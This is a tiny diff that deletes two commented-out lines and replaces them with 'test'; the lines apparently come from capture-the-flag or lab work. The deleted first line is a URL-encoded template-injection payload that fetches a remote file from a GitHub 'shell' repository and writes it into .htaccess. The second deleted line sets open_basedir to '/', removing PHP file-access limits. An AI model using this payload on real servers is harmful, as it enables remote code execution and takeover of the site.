@@ -1,2 +1,1 @@
-#http://94.237.54.214:46967/?location={%%20set%20source=[%27https://raw.githubusercontent.com/asterling/shell/main/htaccess%27]|map(%27file_get_contents%27)|join%20%}%20{{{(source):%22.htaccess%22}|map(%22file_put_contents%22)|join()}}
-#php_value open_basedir "/"
+test
